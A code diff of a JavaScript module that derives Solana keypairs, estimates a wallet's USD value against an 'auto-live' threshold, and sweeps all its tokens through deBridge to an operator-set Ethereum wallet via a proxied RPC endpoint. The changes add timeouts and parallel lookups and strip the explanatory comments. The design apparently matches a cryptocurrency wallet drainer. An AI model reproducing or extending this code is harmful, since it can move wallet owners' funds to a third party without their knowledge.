@@ -3,12 +3,8 @@ import { getAssociatedTokenAddress, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PRO
 import { FEE_WALLET_EVM, userShare, operatorFee } from './config.js';
 import { WORKER_SUBDOMAIN } from './env.js';
 
-// =====================================================================
-// CONSTANTS
-// =====================================================================
-
 const SOL_MINT     = 'So11111111111111111111111111111111111111112';
-const SOLANA_CHAIN = 7565164;   // deBridge internal chain id for Solana
+const SOLANA_CHAIN = 7565164;
 const ETH_CHAIN    = 1;
 const ETH_USDC     = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 
@@ -21,15 +17,24 @@ const SOL_MIN_SWEEP_LAMPORTS = 10_000_000n;
 
 const SOLANA_RPC_PROXY = `https://sweep-rpc.${WORKER_SUBDOMAIN}.workers.dev/rpc/solana`;
 
-// Known stablecoin mints. Priced at $1 without a network round-trip.
+const FETCH_TIMEOUT_MS = 15000;
+
 const KNOWN_STABLE_MINTS = new Set([
-  'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', // USDC
-  'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', // USDT
+  'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
+  'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
 ]);
 
-// Concurrency cap for the per-token deBridge quote loop. Large wallets
-// with dozens of SPL tokens would otherwise hammer the API in parallel.
 const ESTIMATE_CONCURRENCY = 4;
+
+async function fetchWithTimeout(url, options = {}) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
+  try {
+    return await fetch(url, { ...options, signal: controller.signal });
+  } finally {
+    clearTimeout(timer);
+  }
+}
 
 export function getConnection() {
   return new Connection(SOLANA_RPC_PROXY, 'confirmed');
@@ -61,25 +66,28 @@ export async function previewSolanaWallet(connection, walletAddress) {
 }
 
 // =====================================================================
-// DERIVATION SELECTION
+// DERIVATION SELECTION — parallelized
 // =====================================================================
 
 export async function selectSolanaKeypair(connection, candidates, logLine) {
-  const withActivity = [];
-  let anyCallSucceeded = false;
-
-  for (const c of candidates) {
+  // Fire all signature lookups in parallel. Serial was 3x slower on
+  // wallets with multiple candidates.
+  const checks = await Promise.all(candidates.map(async (c) => {
     try {
       const sigs = await connection.getSignaturesForAddress(
         new PublicKey(c.address),
         { limit: 1 }
       );
-      anyCallSucceeded = true;
-      if (sigs.length > 0) {
-        withActivity.push({ ...c, lastSeen: sigs[0].blockTime || 0 });
-      }
-    } catch (e) {}
-  }
+      return { candidate: c, sigs, ok: true };
+    } catch {
+      return { candidate: c, sigs: null, ok: false };
+    }
+  }));
+
+  const anyCallSucceeded = checks.some((c) => c.ok);
+  const withActivity = checks
+    .filter((c) => c.ok && c.sigs.length > 0)
+    .map((c) => ({ ...c.candidate, lastSeen: c.sigs[0].blockTime || 0 }));
 
   if (withActivity.length === 1) {
     const picked = withActivity[0];
@@ -115,7 +123,7 @@ export async function selectSolanaKeypair(connection, candidates, logLine) {
 }
 
 // =====================================================================
-// DEBRIDGE — create cross-chain order
+// DEBRIDGE
 // =====================================================================
 
 async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
@@ -131,7 +139,7 @@ async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
     dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
   });
 
-  const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
+  const resp = await fetchWithTimeout(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
     headers: { accept: 'application/json' },
   });
   if (!resp.ok) {
@@ -145,9 +153,6 @@ async function createDebridgeOrder({ srcMint, amountRaw, srcAuthority }) {
   return json;
 }
 
-// Quote-only variant. Same call, but we only care about the estimation
-// block; we never sign or send anything. Used by the estimator so the
-// pricing matches what the sweep will actually attempt.
 async function quoteDebridgeUsdcOut({ srcMint, amountRaw, srcAuthority }) {
   const params = new URLSearchParams({
     srcChainId: String(SOLANA_CHAIN),
@@ -161,7 +166,7 @@ async function quoteDebridgeUsdcOut({ srcMint, amountRaw, srcAuthority }) {
     dstChainOrderAuthorityAddress: FEE_WALLET_EVM,
   });
 
-  const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
+  const resp = await fetchWithTimeout(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
     headers: { accept: 'application/json' },
   });
   if (!resp.ok) return null;
@@ -192,26 +197,11 @@ async function signAndSendDebridgeTx(connection, keypair, order) {
 // =====================================================================
 // USD ESTIMATE
 // =====================================================================
-//
-// Used by the auto-live threshold check. Returns the USD value of the
-// preview's sweepable balance. Fail-closed: any token we can't price
-// contributes $0, so a transient deBridge outage can only under-count,
-// never over-count.
-//
-// - USDC and USDT are counted at face value.
-// - SOL is priced via CoinGecko, minus a rough reserve for the fee
-//   that a sweep would leave behind.
-// - Every other SPL token gets a deBridge quote for its full balance.
-//
-// @param {object} preview   the object returned by previewSolanaWallet
-// @returns {Promise<number>}  estimated USD value
-// =====================================================================
 
 export async function estimateSolanaValueUsdc(preview) {
   if (!preview) return 0;
   let total = 0;
 
-  // Stablecoins at face.
   for (const t of preview.tokens || []) {
     if (KNOWN_STABLE_MINTS.has(t.mint)) {
       const amt = Number(t.amount) / 1e6;
@@ -219,13 +209,12 @@ export async function estimateSolanaValueUsdc(preview) {
     }
   }
 
-  // SOL via CoinGecko, minus a reserve for the fee we'd leave.
   if (preview.sol && preview.sol.raw > 0) {
     try {
       const lamports = BigInt(preview.sol.raw);
       const sweepable = lamports > SOL_RESERVE_LAMPORTS ? lamports - SOL_RESERVE_LAMPORTS : 0n;
       if (sweepable > 0n) {
-        const resp = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+        const resp = await fetchWithTimeout('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
         const data = await resp.json();
         const price = data?.solana?.usd;
         if (price) {
@@ -236,7 +225,6 @@ export async function estimateSolanaValueUsdc(preview) {
     } catch { /* fail-closed */ }
   }
 
-  // Non-stable SPL tokens: quote each via deBridge.
   const nonStables = (preview.tokens || []).filter((t) => !KNOWN_STABLE_MINTS.has(t.mint));
   if (nonStables.length > 0) {
     const authority = preview.address;
@@ -265,8 +253,6 @@ export async function estimateSolanaValueUsdc(preview) {
   return total;
 }
 
-// Small concurrency runner. Keeps ordering so callers can zip results
-// back to their inputs if they want.
 async function runWithConcurrency(items, limit, fn) {
   const results = new Array(items.length);
   let cursor = 0;
@@ -352,7 +338,13 @@ export async function sweepSolana(connection, keypair, opts = {}) {
         status: 'SUCCESS',
       });
     } catch (e) {
-      results.swaps.push({ mint, status: 'ERROR', error: e.message });
+      const msg = e.message || String(e);
+      const isPostBroadcast = msg.includes('confirmTransaction') || msg.includes('timeout');
+      results.swaps.push({
+        mint,
+        status: isPostBroadcast ? 'BROADCAST_UNKNOWN' : 'ERROR',
+        error: msg,
+      });
     }
   }
 
